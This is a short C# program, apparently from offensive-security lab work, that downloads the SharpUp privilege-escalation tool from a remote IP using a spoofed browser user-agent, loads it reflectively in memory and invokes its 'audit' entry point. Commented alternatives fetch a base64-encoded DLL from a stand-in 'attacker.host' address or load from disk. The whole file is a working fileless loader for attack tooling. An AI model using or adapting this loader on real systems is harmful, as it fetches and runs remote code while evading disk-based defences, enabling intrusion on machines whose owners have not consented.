using System;
using System.Reflection;
using System.Net;

namespace SharpUpAssemblyLoad
{
    class Program
    {

        static public void Main(String[] args)

        {


            Console.WriteLine("Running SharpUp.exe");

            var wc = new WebClient();
            wc.Headers.Add("user-agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.117 Safari/537.36");

            // Reflectively load assembly from a file on disk
            // Assembly assembly = Assembly.LoadFile(@"C:\\Users\mikeg\Source\Repos\SharpEnumLibrary\SharpEnumLibrary\bin\Debug\SharpEnumLibrary.dll");

            // Reflectively load assembly from a remote URL
            Assembly assembly = Assembly.Load(wc.DownloadData("http://192.168.49.207/sharpup.exe"));

            // Reflectively load assembly from base64 encoded file via a remote URL
            // Assembly assembly = Assembly.Load(System.Convert.FromBase64String(wc.DownloadString("https://attacker.host/SharpEnumLibrary.dll.b64")));

            // Get your assembly.
            //Assembly assembly = Assembly.LoadFile(@"C:\Users\Offsec\Desktop\SharpUp\SharpUp\bin\x64\Release\SharpUp.exe");

            // Get your point of entry.
            MethodInfo entryPoint = assembly.EntryPoint;

            // Invoke point of entry with arguments.
            entryPoint.Invoke(null, new object[] { new string[] { "audit" } });

        }



    }
}
